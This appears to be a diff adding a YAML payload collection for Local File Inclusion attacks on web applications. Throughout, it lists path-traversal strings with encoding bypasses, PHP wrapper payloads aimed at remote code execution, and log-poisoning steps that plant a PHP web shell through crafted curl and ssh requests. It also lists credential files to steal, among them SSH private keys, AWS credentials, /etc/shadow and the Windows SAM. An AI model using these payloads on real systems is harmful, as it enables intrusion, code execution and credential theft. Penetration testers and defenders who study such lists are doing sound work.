@@ -1,0 +1,172 @@
+# lfi.yaml — Local File Inclusion payloads
+metadata:
+  version: "1.0"
+  sources:
+    - "AllAboutBugBounty/daffainfo"
+    - "PayloadsAllTheThings/File Inclusion"
+    - "OWASP Path Traversal"
+    - "PHP filter chain research"
+  last_updated: "2026-03-27"
+
+# ──────────────────────────────────────────────
+# 14 LFI TECHNIQUES
+# ──────────────────────────────────────────────
+
+basic_traversal:
+  - name: basic_dot_dot_slash
+    payload: "../../../../etc/passwd"
+    context: "URL parameter that includes a file path"
+    notes: "Basic directory traversal. Adjust depth (number of ../) to reach root."
+
+  - name: absolute_path
+    payload: "/etc/passwd"
+    context: "URL parameter that may accept absolute paths"
+    notes: "Direct absolute path when traversal filtering removes ../ but allows /."
+
+encoding_bypass:
+  - name: url_encoded_traversal
+    payload: "..%2f..%2f..%2f..%2fetc%2fpasswd"
+    context: "When ../ is blocked but URL encoding is decoded server-side"
+    notes: "%2f is URL-encoded forward slash. Bypasses string-based ../ filters."
+
+  - name: double_url_encoded
+    payload: "..%252f..%252f..%252f..%252fetc%252fpasswd"
+    context: "When server double-decodes URL parameters"
+    notes: "Double encoding: %252f decodes to %2f, then to /."
+
+  - name: utf8_overlong_encoding
+    payload: "..%c0%af..%c0%af..%c0%afetc/passwd"
+    context: "When basic URL encoding is filtered but UTF-8 is not"
+    notes: "%c0%af is overlong UTF-8 encoding of /. Works on some older systems."
+
+  - name: null_byte_termination
+    payload: "../../../../etc/passwd%00.jpg"
+    context: "When file extension is appended server-side (PHP < 5.3.4)"
+    notes: "Null byte terminates string in C-based functions. PHP < 5.3.4 only."
+
+  - name: dot_truncation
+    payload: "../../../../etc/passwd........................................................(x256)"
+    context: "PHP on Windows, where path is truncated at 256+ chars"
+    notes: "PHP truncates paths beyond MAX_PATH. Pad with dots to cut appended extension."
+
+php_wrappers:
+  - name: php_filter_base64
+    payload: "php://filter/convert.base64-encode/resource=index.php"
+    context: "PHP application with LFI. Reads source code."
+    notes: "Base64 encodes file content, preventing PHP execution. Decode output to get source."
+
+  - name: php_filter_chain_rce
+    payload: "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|[CHAIN]|convert.base64-decode/resource=php://temp"
+    context: "PHP application where you need RCE via filter chains (no file upload needed)"
+    notes: "PHP filter chain technique generates arbitrary content via iconv conversions. Use php_filter_chain_generator.py tool to build the chain for your payload."
+
+  - name: php_input_rce
+    payload: "php://input"
+    context: "PHP with allow_url_include=On. Send PHP code in POST body: <?php system('id'); ?>"
+    notes: "Reads raw POST body as PHP code. Requires allow_url_include=On."
+
+  - name: php_data_rce
+    payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
+    context: "PHP with allow_url_include=On"
+    notes: "Data URI with base64-encoded PHP code: <?php system('id'); ?>. Direct RCE."
+
+  - name: php_expect_rce
+    payload: "expect://id"
+    context: "PHP with expect:// wrapper enabled (PECL extension)"
+    notes: "Directly executes system command. Requires expect PECL extension (rare)."
+
+  - name: php_zip_rce
+    payload: "zip:///tmp/evil.zip%23shell.php"
+    context: "PHP application where you can upload a ZIP file"
+    notes: "Upload ZIP containing shell.php. Access via zip:// wrapper. %23 is # separator."
+
+log_poisoning:
+  - name: log_poisoning_apache
+    payload: "../../../../var/log/apache2/access.log"
+    context: "First poison the log with: curl -A '<?php system($_GET[\"cmd\"]); ?>' http://target/"
+    notes: "Step 1: Send request with PHP code in User-Agent. Step 2: Include the log file. Step 3: Add &cmd=id to execute commands."
+
+  - name: log_poisoning_ssh
+    payload: "../../../../var/log/auth.log"
+    context: "First poison auth.log: ssh '<?php system($_GET[\"cmd\"]); ?>'@target"
+    notes: "SSH login attempt logs the username. Include auth.log to execute the PHP code."
+
+  - name: proc_self_environ
+    payload: "../../../../proc/self/environ"
+    context: "Linux system where /proc is readable"
+    notes: "Contains environment variables. If User-Agent is in env (CGI), poison it with PHP code."
+
+# ──────────────────────────────────────────────
+# LINUX TARGET FILES
+# ──────────────────────────────────────────────
+
+linux_paths:
+  - name: etc_passwd
+    payload: "/etc/passwd"
+    context: "Confirm LFI on Linux"
+    notes: "World-readable on all Linux systems. Confirms LFI vulnerability."
+
+  - name: etc_shadow
+    payload: "/etc/shadow"
+    context: "LFI with elevated privileges"
+    notes: "Contains password hashes. Requires root or shadow group access."
+
+  - name: proc_self_cmdline
+    payload: "/proc/self/cmdline"
+    context: "Identify running process"
+    notes: "Shows the command line of the current process."
+
+  - name: proc_self_fd
+    payload: "/proc/self/fd/0"
+    context: "Access file descriptors of current process"
+    notes: "Iterate fd numbers (0-20) to find open files, sockets, etc."
+
+  - name: ssh_private_key
+    payload: "/home/USER/.ssh/id_rsa"
+    context: "LFI targeting SSH keys. Replace USER with discovered usernames from /etc/passwd."
+    notes: "Private SSH key enables direct server access."
+
+  - name: aws_credentials
+    payload: "/home/USER/.aws/credentials"
+    context: "LFI targeting AWS credentials on developer machines or EC2"
+    notes: "Contains AWS access keys. Check /root/.aws/credentials too."
+
+  - name: docker_env
+    payload: "/proc/1/environ"
+    context: "LFI in containerized (Docker) environment"
+    notes: "PID 1 in containers is the app process. Environment often has secrets."
+
+# ──────────────────────────────────────────────
+# WINDOWS TARGET FILES
+# ──────────────────────────────────────────────
+
+windows_paths:
+  - name: win_ini
+    payload: "C:\\Windows\\win.ini"
+    context: "Confirm LFI on Windows"
+    notes: "Always present on Windows. Confirms LFI vulnerability."
+
+  - name: win_hosts
+    payload: "C:\\Windows\\System32\\drivers\\etc\\hosts"
+    context: "Read Windows hosts file"
+    notes: "May reveal internal hostnames and IP mappings."
+
+  - name: win_iis_web_config
+    payload: "C:\\inetpub\\wwwroot\\web.config"
+    context: "IIS web server LFI"
+    notes: "Contains connection strings, app settings, auth configs."
+
+  - name: win_sam
+    payload: "C:\\Windows\\System32\\config\\SAM"
+    context: "LFI with SYSTEM privileges on Windows"
+    notes: "Contains local user password hashes. Requires SYSTEM access."
+
+  - name: win_unattend
+    payload: "C:\\Windows\\Panther\\Unattend.xml"
+    context: "Windows system that was deployed via unattended install"
+    notes: "May contain plaintext admin passwords from automated deployment."
+
+  - name: win_iis_logs
+    payload: "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex260327.log"
+    context: "IIS log file (adjust date in filename)"
+    notes: "IIS access logs. Useful for log poisoning attack chain."
